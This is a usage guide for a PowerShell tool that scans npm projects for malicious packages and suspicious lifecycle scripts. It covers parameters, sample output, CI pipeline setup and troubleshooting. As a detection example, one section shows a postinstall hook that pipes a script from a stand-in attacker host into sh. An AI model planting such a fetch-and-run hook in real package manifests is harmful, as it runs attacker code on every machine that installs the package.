# Usage Guide

## Basic Syntax

```powershell
./npm-iocscan.ps1 -Path <directory> [-ScanTransitive]
```

### Parameters

| Parameter | Type | Required | Default | Description |
|---|---|---|---|---|
| `-Path` | string | No | `.` | Root directory to scan (recursively finds all `package*.json` and lockfiles) |
| `-ScanTransitive` | switch | No | $false | Resolve full dependency trees in isolated containers (requires Docker) |

---

## Examples

### 1. Quick Static Scan (No Docker)
Fastest way to scan a project for known IOCs in declared dependencies:

```powershell
cd C:\Projects\my-app
.\npm-iocscan.ps1 -Path .
```

**Output:**
```
Scanning 2 file(s) for npm security indicators...

✓ No IOCs or suspicious lifecycle scripts detected in static analysis.
```

---

### 2. Full Scan with Transitive Dependencies
Resolves the complete dependency tree and checks every package (without executing scripts):

```powershell
.\npm-iocscan.ps1 -Path . -ScanTransitive
```

**Output:**
```
Scanning 2 file(s) for npm security indicators...

✓ No IOCs or suspicious lifecycle scripts detected in static analysis.

Scanning resolved transitive dependencies (--ignore-scripts)...
  Project: .\frontend
    Resolved 87 dependencies (no scripts executed)
```

---

### 3. Scan a Monorepo
Recursively finds all `package.json` files across multiple projects:

```powershell
.\npm-iocscan.ps1 -Path C:\Projects\monorepo -ScanTransitive
```

**Output:**
```
Scanning 5 file(s) for npm security indicators...

✓ No IOCs or suspicious lifecycle scripts detected in static analysis.

Scanning resolved transitive dependencies (--ignore-scripts)...
  Project: .\packages\core
    Resolved 120 dependencies (no scripts executed)
  Project: .\packages\ui
    Resolved 95 dependencies (no scripts executed)
  Project: .\apps\web
    Resolved 145 dependencies (no scripts executed)
```

---

### 4. Detect a Malicious Package (Example)

Assuming a project contains a typosquatted package:

```powershell
# package.json contains: "plain-crypto-js": "^1.0.0"
.\npm-iocscan.ps1 -Path .
```

**Output:**
```
Scanning 1 file(s) for npm security indicators...

[CRITICAL] Malicious Package
  File: .\package.json
  Package: plain-crypto-js
  Version: ^1.0.0
  
Found 1 potential issue(s).
```

---

### 5. Detect a Suspicious Lifecycle Script

```powershell
# package.json contains:
# "scripts": {
#   "postinstall": "curl http://attacker.com/payload.sh | sh"
# }
.\npm-iocscan.ps1 -Path .
```

**Output:**
```
Scanning 1 file(s) for npm security indicators...

[HIGH] Lifecycle Script: postinstall
  File: .\package.json
  Package: package.json
  Version: curl http://attacker.com/payload.sh | sh...
  Content: Shell command: curl
  
[CRITICAL] Exfiltration Indicator
  File: .\package.json
  Content: curl http://attacker.com/payload.sh | sh

Found 2 potential issue(s).
```

---

## Output Severity Levels

| Severity | Meaning | Action |
|---|---|---|
| **CRITICAL** | Confirmed malicious package or active exfiltration attempt | Remove from manifest immediately. Check git history. Rotate secrets. |
| **HIGH** | Suspicious lifecycle script with shell execution or suspicious content | Manual code review. Verify legitimacy with upstream. |
| **MEDIUM** | Lifecycle script present (may be benign) | Review script content for suspicious patterns. |

---

## CI/CD Integration

### GitHub Actions

```yaml
name: Security Scan

on: [push, pull_request]

jobs:
  npm-security:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Scan for npm IOCs
        run: |
          .\npm-iocscan.ps1 -Path . -ScanTransitive
```

### Azure Pipelines

```yaml
trigger:
  - main

pool:
  vmImage: 'windows-latest'

steps:
  - task: PowerShell@2
    displayName: 'npm Security Scan'
    inputs:
      targetType: 'filePath'
      filePath: '$(Build.SourcesDirectory)\npm-iocscan.ps1'
      arguments: '-Path $(Build.SourcesDirectory) -ScanTransitive'
```

### GitLab CI

```yaml
security:scan:
  image: mcr.microsoft.com/powershell:latest
  script:
    - .\npm-iocscan.ps1 -Path . -ScanTransitive
  allow_failure: false
```

---

## Troubleshooting

### Error: "Failed to parse package.json"

**Cause:** Malformed JSON in the manifest.

**Solution:** Validate JSON syntax:
```powershell
Get-Content package.json | ConvertFrom-Json
```

---

### Error: "Cannot run script. Scripts are disabled on this system."

**Cause:** PowerShell execution policy is too restrictive.

**Solution:** Temporarily allow script execution:
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
.\npm-iocscan.ps1 -Path .
```

Or permanently (if running as admin):
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

---

### Transitive Scan Hangs / Slow

**Cause:** Large monorepo or slow Docker image pull.

**Solution:**
1. Pre-pull the node image: `docker pull node:20-alpine`
2. Run static scan first to identify critical issues: `.\npm-iocscan.ps1 -Path .`
3. Scan individual projects instead of entire monorepo:
   ```powershell
   .\npm-iocscan.ps1 -Path .\apps\web -ScanTransitive
   ```

---

### False Positives

**Legitimate `postinstall` script flagged as suspicious:**

Review the script content in `package.json`. Common false positives:
- `postinstall: "npm run build"` – Legitimate build step
- `postinstall: "tsc"` – TypeScript compilation
- `postinstall: "husky install"` – Git hooks setup

These are **MEDIUM** severity and require manual verification. If trusted:
1. Review upstream project's README
2. Check GitHub issues/discussions
3. Verify script hasn't been recently modified

---

## Performance Tips

1. **Skip transitive scans for initial rapid checks** – Use `-Path .` without `-ScanTransitive`
2. **Cache Docker image** – Pre-pull `node:20-alpine` for faster subsequent runs
3. **Scan targeted directories** – Don't scan entire repo if you know affected projects
4. **Run in CI/CD only** – Use comprehensive scans as part of PR/release gates, not local development

---

## Integration with Other Tools

### Combine with `npm audit`
```powershell
npm audit --production
.\npm-iocscan.ps1 -Path . -ScanTransitive
```

### Export findings to JSON
Modify the scanner to output JSON (enhancement opportunity):
```powershell
# Store $foundIssues in JSON format for tooling integration
$foundIssues | ConvertTo-Json | Out-File npm-scan-results.json
```

### Integration with SIEM
Feed scanner output to centralized logging:
```powershell
.\npm-iocscan.ps1 -Path . -ScanTransitive | 
  % { 
    $_ | Add-Member -NotePropertyName timestamp -NotePropertyValue (Get-Date -AsUTC) | 
    ConvertTo-Json 
  } | 
  Send-LogFile -LogAnalyticsWorkspaceId $workspaceId -SharedKey $sharedKey
```

---

## Best Practices

1. **Run on every `package.json` commit** – Add pre-commit hook or CI gate
2. **Update IOC list regularly** – Check GitHub releases monthly
3. **Review all MEDIUM/HIGH findings** – Don't auto-dismiss lifecycle scripts
4. **Combine with code review** – Scanner catches IOCs, not malicious logic patterns
5. **Maintain audit trail** – Log scanner output for compliance
6. **Test false positive rate** – Run against known-good projects to establish baseline

